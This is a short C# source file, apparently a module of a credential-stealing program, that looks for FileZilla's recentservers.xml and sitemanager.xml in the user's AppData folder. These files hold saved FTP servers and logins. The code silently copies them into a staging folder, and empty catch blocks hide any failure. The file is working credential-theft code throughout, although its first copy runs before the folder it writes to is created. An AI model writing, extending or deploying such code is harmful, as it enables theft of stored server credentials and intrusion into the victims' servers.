using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace loki.loki.Utilies.App
{
    class FileZilla
    {
        public static void get_filezilla(string string_0)
        {

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
            {
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", string_0 + "\\Apps\\FileZilla\\filezilla_recentservers.xml", true);
                }
                catch
                {
                }
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
                {
                    try
                    {
                        Directory.CreateDirectory(string_0 + "\\Apps\\FileZilla");
                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", string_0 + "\\Apps\\FileZilla\\filezilla_sitemanager.xml", true);
                    }
                    catch
                    {
                    }
                }
            }
        }
    }
}
